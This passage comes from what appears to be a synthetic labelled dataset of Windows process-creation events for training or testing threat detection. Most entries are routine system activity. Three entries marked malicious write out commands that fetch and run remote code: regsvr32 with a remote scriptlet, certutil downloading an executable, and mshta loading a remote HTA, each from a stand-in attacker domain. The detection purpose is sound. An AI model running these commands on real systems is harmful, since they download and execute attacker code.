    "ProcessGuid": "{97928ADC-BF61-4BF6-A7D6-B16D207DF91E}",
    "ProcessId": 40913,
    "Image": "C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe",
    "CommandLine": "OneDrive.exe /sync",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\POWERPNT.EXE",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\POWERPNT.EXE\"",
    "ParentProcessId": 3474,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T07:37:20.825Z",
    "ProcessGuid": "{BC91EB97-EBFF-483A-AB93-4AF5BF994178}",
    "ProcessId": 49372,
    "Image": "C:\\Windows\\servicing\\TrustedInstaller.exe",
    "CommandLine": "C:\\Windows\\servicing\\TrustedInstaller.exe",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 46719,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T11:26:48.648Z",
    "ProcessGuid": "{93650D7F-D600-4BE7-905B-BD80F4940FDC}",
    "ProcessId": 29219,
    "Image": "C:\\Windows\\System32\\dwm.exe",
    "CommandLine": "dwm.exe",
    "ParentImage": "C:\\Windows\\System32\\smss.exe",
    "ParentCommandLine": "smss.exe",
    "ParentProcessId": 55142,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T14:11:53.786Z",
    "ProcessGuid": "{5CD12658-756E-413B-83B6-E11819C69BF8}",
    "ProcessId": 54206,
    "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
    "CommandLine": "wmic.exe diskdrive get model,size,status",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 46680,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-03T11:33:27.302Z",
    "ProcessGuid": "{290807E0-A748-473E-99B9-C733F18E3A8E}",
    "ProcessId": 38259,
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "CommandLine": "certutil.exe -verify -urlfetch C:\\Certs\\server16.cer",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 4127,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-04T15:41:13.908Z",
    "ProcessGuid": "{2D764E9B-8DDE-436B-9931-FEFB5983A03F}",
    "ProcessId": 36679,
    "Image": "C:\\Windows\\System32\\regsvr32.exe",
    "CommandLine": "regsvr32.exe /s C:\\Program Files\\Microsoft Office\\root\\Office16\\GROOVEEX.DLL",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe /c",
    "ParentProcessId": 41918,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-05T02:25:55.317Z",
    "ProcessGuid": "{D46D90F0-45FE-4994-9F65-918584AEEF31}",
    "ProcessId": 49877,
    "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
    "CommandLine": "\"C:\\Program Files\\Windows Defender\\MsMpEng.exe\"",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 23250,
    "User": "NT AUTHORITY\\LOCAL SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T15:16:13.477Z",
    "ProcessGuid": "{3A5743B5-1800-4400-8449-6AA9356E3E27}",
    "ProcessId": 20801,
    "Image": "C:\\Windows\\System32\\msiexec.exe",
    "CommandLine": "msiexec.exe /i C:\\Temp\\update_5.6.48.msi /passive /norestart",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 45380,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T23:35:26.764Z",
    "ProcessGuid": "{882F0C63-5C80-4DB1-BA8F-69414C8D7094}",
    "ProcessId": 7914,
    "Image": "C:\\Windows\\System32\\schtasks.exe",
    "CommandLine": "schtasks.exe /run /tn \"\\Microsoft\\Windows\\WindowsUpdate\\Automatic App Update\"",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
    "ParentProcessId": 51219,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T09:43:42.504Z",
    "ProcessGuid": "{8389CDF9-B3FE-4E88-AA56-154A973408C1}",
    "ProcessId": 41227,
    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "CommandLine": "chrome.exe --type=renderer --field-trial-handle=12345",
    "ParentImage": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "ParentCommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"",
    "ParentProcessId": 1434,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Low",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T18:03:27.678Z",
    "ProcessGuid": "{289E09C5-165F-4BF3-931B-2FF2A3EAFD17}",
    "ProcessId": 64191,
    "Image": "C:\\Windows\\System32\\wuauclt.exe",
    "CommandLine": "wuauclt.exe /detectnow /updatenow",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 9566,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T15:45:59.158Z",
    "ProcessGuid": "{1AC50B77-C47A-4EEF-8F06-3B49688CBD66}",
    "ProcessId": 3617,
    "Image": "C:\\Windows\\System32\\mmc.exe",
    "CommandLine": "mmc.exe diskmgmt.msc",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 11073,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T13:35:59.956Z",
    "ProcessGuid": "{B7C8FD14-B6E9-4293-8E91-45786DCB0A57}",
    "ProcessId": 53127,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c type C:\\Windows\\System32\\drivers\\etc\\hosts",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 48294,
    "User": "CORP\\analyst01",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T10:06:05.335Z",
    "ProcessGuid": "{46E93871-3340-450F-BE0C-3058C971A157}",
    "ProcessId": 44314,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k NetworkService",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 20375,
    "User": "NT AUTHORITY\\NETWORK SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T13:31:56.387Z",
    "ProcessGuid": "{591AF429-7875-4454-9A9E-6374B3163771}",
    "ProcessId": 24018,
    "Image": "C:\\Windows\\System32\\UsoClient.exe",
    "CommandLine": "UsoClient.exe StartInteractiveScan",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 36784,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T17:50:20.884Z",
    "ProcessGuid": "{E95A2A14-DBB7-407F-BE79-80A9EA9A4268}",
    "ProcessId": 26246,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c net use Z: \\\\fileserver\\share",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 1808,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T15:28:51.586Z",
    "ProcessGuid": "{46C168CB-E282-48F1-A16C-63B93EDDEA97}",
    "ProcessId": 30366,
    "Image": "C:\\Users\\itops\\Downloads\\setup.exe",
    "CommandLine": "setup.exe /S /v/qn",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 6768,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T16:31:03.995Z",
    "ProcessGuid": "{9AFC360E-6420-4D40-B17C-3DD1F326F138}",
    "ProcessId": 23571,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c systeminfo",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 62707,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T09:06:34.172Z",
    "ProcessGuid": "{26AF4673-5563-42A1-A2CA-B1CC14591EEF}",
    "ProcessId": 19700,
    "Image": "C:\\Windows\\System32\\schtasks.exe",
    "CommandLine": "schtasks.exe /run /tn \"\\Microsoft\\Windows\\Defrag\\ScheduledDefrag\"",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 10439,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-04T08:10:18.743Z",
    "ProcessGuid": "{A3BC98D7-85E1-4E6E-BF2E-F01582C65F55}",
    "ProcessId": 13596,
    "Image": "C:\\Windows\\System32\\msiexec.exe",
    "CommandLine": "msiexec.exe /i http://fileserver.corp.local/package29.msi /quiet /norestart",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 31752,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-03T03:50:09.145Z",
    "ProcessGuid": "{8D1D08D8-D838-464F-9A3B-702C735932E5}",
    "ProcessId": 52366,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -File C:\\Scripts\\nightly-backup.ps1",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 39641,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-02T16:20:25.600Z",
    "ProcessGuid": "{626878E6-19AA-43FF-BA5F-4B0A7DE7F507}",
    "ProcessId": 42569,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Test-Connection -ComputerName fileserver -Count 4\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 51018,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T08:54:20.948Z",
    "ProcessGuid": "{075A0B76-2DE8-4544-AA20-97B63DFD03E3}",
    "ProcessId": 53482,
    "Image": "C:\\Windows\\servicing\\TrustedInstaller.exe",
    "CommandLine": "C:\\Windows\\servicing\\TrustedInstaller.exe",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 26752,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T03:12:21.130Z",
    "ProcessGuid": "{75BEEF3A-A526-4A89-9E77-901B6245A956}",
    "ProcessId": 3103,
    "Image": "C:\\Windows\\System32\\regsvr32.exe",
    "CommandLine": "regsvr32 /s /n /u /i:http://c2-server3551.ru/payloads/file183.sct scrobj.dll",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe /c",
    "ParentProcessId": 46364,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1218.010",
    "technique_name": "Regsvr32 Squiblydoo",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-02T21:13:22.816Z",
    "ProcessGuid": "{E6520D41-96FA-4597-93C4-7BBDFC6DF22B}",
    "ProcessId": 17931,
    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "CommandLine": "chrome.exe --no-first-run",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 23304,
    "User": "CORP\\helpdesk",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T22:25:29.791Z",
    "ProcessGuid": "{857B7F7B-C0C6-4F79-9087-76CCD24C60EB}",
    "ProcessId": 45255,
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "CommandLine": "certutil.exe -urlcache -f http://apt-infra682.net/module653.exe C:\\Users\\Public\\patch980.exe",
    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "ParentCommandLine": "powershell.exe",
    "ParentProcessId": 50092,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1105",
    "technique_name": "Certutil Download",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-02T16:42:15.583Z",
    "ProcessGuid": "{74C45D8F-7AAF-475C-A031-E18794E65CDD}",
    "ProcessId": 41981,
    "Image": "C:\\Windows\\System32\\schtasks.exe",
    "CommandLine": "schtasks.exe /run /tn \"\\Microsoft\\Windows\\WindowsUpdate\\Automatic App Update\"",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
    "ParentProcessId": 63095,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T11:03:37.753Z",
    "ProcessGuid": "{2D4EEEDE-E533-43A5-AE03-AC49376B1B85}",
    "ProcessId": 36533,
    "Image": "C:\\Program Files\\Slack\\Slack.exe",
    "CommandLine": "Slack.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 4994,
    "User": "CORP\\helpdesk",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T11:48:53.692Z",
    "ProcessGuid": "{CC655414-A515-4414-99BC-BC6A7FD2D619}",
    "ProcessId": 26736,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Get-EventLog -LogName System -Newest 50\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 33077,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T12:22:01.421Z",
    "ProcessGuid": "{F5F5401C-8B95-42E0-AA31-88B1A47B40F6}",
    "ProcessId": 8945,
    "Image": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
    "CommandLine": "firefox.exe -contentproc -childID 7",
    "ParentImage": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
    "ParentCommandLine": "\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\"",
    "ParentProcessId": 24009,
    "User": "CORP\\dbadmin",
    "IntegrityLevel": "Low",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T17:36:25.869Z",
    "ProcessGuid": "{ED24E269-0A0F-4672-B4AC-0E02C8C8679D}",
    "ProcessId": 60445,
    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "CommandLine": "chrome.exe --type=renderer --field-trial-handle=12345",
    "ParentImage": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "ParentCommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"",
    "ParentProcessId": 5675,
    "User": "CORP\\analyst01",
    "IntegrityLevel": "Low",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T11:47:18.453Z",
    "ProcessGuid": "{F9971A16-1A1A-46F3-8A6B-FA6868F66BDE}",
    "ProcessId": 42057,
    "Image": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
    "CommandLine": "firefox.exe -contentproc -childID 7",
    "ParentImage": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
    "ParentCommandLine": "\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\"",
    "ParentProcessId": 9284,
    "User": "CORP\\pchen",
    "IntegrityLevel": "Low",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T02:59:37.041Z",
    "ProcessGuid": "{FAACEF10-76D7-4DB0-9DA5-94DB46F280B5}",
    "ProcessId": 9740,
    "Image": "C:\\Windows\\System32\\mshta.exe",
    "CommandLine": "mshta.exe http://loader-cdn756.org/script344.hta",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 7551,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1218.005",
    "technique_name": "Mshta Remote HTA",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-01T11:27:56.409Z",
    "ProcessGuid": "{1EE280B0-0DBD-4992-B740-8B2A215CCF90}",
    "ProcessId": 49713,
    "Image": "C:\\Windows\\System32\\lsass.exe",
    "CommandLine": "C:\\Windows\\System32\\lsass.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 29818,
    "User": "NT AUTHORITY\\LOCAL SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T08:47:16.207Z",
    "ProcessGuid": "{CEA78A52-962B-45EE-865D-1C02F141B05E}",
    "ProcessId": 41669,
    "Image": "C:\\Windows\\System32\\perfmon.exe",
    "CommandLine": "perfmon.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 57940,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T21:50:28.035Z",
    "ProcessGuid": "{8F81149D-1528-4A9E-BC31-01EAB3293E64}",
    "ProcessId": 9272,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 5406,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T12:39:47.862Z",
    "ProcessGuid": "{1DF6C1E3-7810-4191-A706-2892E1996218}",
    "ProcessId": 20610,
    "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
    "CommandLine": "\"C:\\Program Files\\Windows Defender\\MsMpEng.exe\"",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 39910,
    "User": "NT AUTHORITY\\LOCAL SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T10:00:22.808Z",
    "ProcessGuid": "{D5E5B604-0F7E-4257-AE4C-2FAE53A74EDB}",
    "ProcessId": 52670,
    "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
    "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 16593,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T16:26:10.836Z",
    "ProcessGuid": "{50CE5C9C-2382-4E95-B64D-6A12DFE0EA7E}",
    "ProcessId": 14087,
    "Image": "C:\\Windows\\System32\\spoolsv.exe",
    "CommandLine": "C:\\Windows\\System32\\spoolsv.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 53511,
    "User": "NT AUTHORITY\\LOCAL SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
